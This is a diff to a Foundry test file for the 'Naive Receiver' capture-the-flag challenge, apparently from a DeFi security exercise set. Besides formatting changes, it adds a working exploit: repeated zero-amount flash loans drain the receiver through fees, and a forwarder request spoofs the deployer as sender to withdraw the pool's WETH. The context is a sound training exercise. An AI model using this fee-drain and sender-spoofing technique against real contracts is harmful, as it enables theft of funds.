@@ -3,8 +3,14 @@
 pragma solidity =0.8.25;
 
 import {Test, console} from "forge-std/Test.sol";
-import {NaiveReceiverPool, Multicall, WETH} from "../../src/naive-receiver/NaiveReceiverPool.sol";
-import {FlashLoanReceiver} from "../../src/naive-receiver/FlashLoanReceiver.sol";
+import {
+    NaiveReceiverPool,
+    Multicall,
+    WETH
+} from "../../src/naive-receiver/NaiveReceiverPool.sol";
+import {
+    FlashLoanReceiver
+} from "../../src/naive-receiver/FlashLoanReceiver.sol";
 import {BasicForwarder} from "../../src/naive-receiver/BasicForwarder.sol";
 
 contract NaiveReceiverChallenge is Test {
@@ -42,7 +48,11 @@ contract NaiveReceiverChallenge is Test {
         forwarder = new BasicForwarder();
 
         // Deploy pool and fund with ETH
-        pool = new NaiveReceiverPool{value: WETH_IN_POOL}(address(forwarder), payable(weth), deployer);
+        pool = new NaiveReceiverPool{value: WETH_IN_POOL}(
+            address(forwarder),
+            payable(weth),
+            deployer
+        );
 
         // Deploy flashloan receiver contract and fund it with some initial WETH
         receiver = new FlashLoanReceiver(address(pool));
@@ -62,7 +72,7 @@ contract NaiveReceiverChallenge is Test {
         assertEq(pool.flashFee(address(weth), 0), 1 ether);
         assertEq(pool.feeReceiver(), deployer);
 
-        // Cannot call receiver
+        // Cannot call receiver (only pool can!)
         vm.expectRevert(bytes4(hex"48f5c3ed"));
         receiver.onFlashLoan(
             deployer,
@@ -77,7 +87,56 @@ contract NaiveReceiverChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_naiveReceiver() public checkSolvedByPlayer {
-        
+        bytes memory flashloanCalldata = abi.encodeWithSignature(
+            "flashLoan(address,address,uint256,bytes)",
+            receiver,
+            weth,
+            0,
+            ""
+        );
+
+        bytes memory withdrawCall = abi.encodeWithSignature(
+            "withdraw(uint256,address)",
+            WETH_IN_POOL + WETH_IN_RECEIVER,
+            recovery
+        );
+
+        bytes memory payload = abi.encodePacked(withdrawCall, deployer);
+
+        bytes[] memory calls = new bytes[](11);
+
+        for (uint i = 0; i <= 9; i++) {
+            calls[i] = flashloanCalldata;
+        }
+        calls[10] = payload;
+
+        bytes memory multicallCall = abi.encodeWithSignature(
+            "multicall(bytes[])",
+            calls
+        );
+
+        BasicForwarder.Request memory req = BasicForwarder.Request({
+            from: player, // signer / original sender
+            target: address(pool), // contract to call through forwarder
+            value: 0, // ETH to forward
+            gas: 500_000, // gas for inner call
+            nonce: forwarder.nonces(player), // must match forwarder state
+            data: multicallCall,
+            deadline: block.timestamp + 1 hours // must be in the future
+        });
+
+        bytes32 structHash = forwarder.getDataHash(req);
+        bytes32 digest = keccak256(
+            abi.encodePacked(
+                "\x19\x01",
+                forwarder.domainSeparator(),
+                structHash
+            )
+        );
+        (uint8 v, bytes32 r, bytes32 s) = vm.sign(playerPk, digest);
+        bytes memory signature = abi.encodePacked(r, s, v);
+
+        forwarder.execute(req, signature);
     }
 
     /**
@@ -88,12 +147,24 @@ contract NaiveReceiverChallenge is Test {
         assertLe(vm.getNonce(player), 2);
 
         // The flashloan receiver contract has been emptied
-        assertEq(weth.balanceOf(address(receiver)), 0, "Unexpected balance in receiver contract");
+        assertEq(
+            weth.balanceOf(address(receiver)),
+            0,
+            "Unexpected balance in receiver contract"
+        );
 
         // Pool is empty too
-        assertEq(weth.balanceOf(address(pool)), 0, "Unexpected balance in pool");
+        assertEq(
+            weth.balanceOf(address(pool)),
+            0,
+            "Unexpected balance in pool"
+        );
 
         // All funds sent to recovery account
-        assertEq(weth.balanceOf(recovery), WETH_IN_POOL + WETH_IN_RECEIVER, "Not enough WETH in recovery account");
+        assertEq(
+            weth.balanceOf(recovery),
+            WETH_IN_POOL + WETH_IN_RECEIVER,
+            "Not enough WETH in recovery account"
+        );
     }
 }
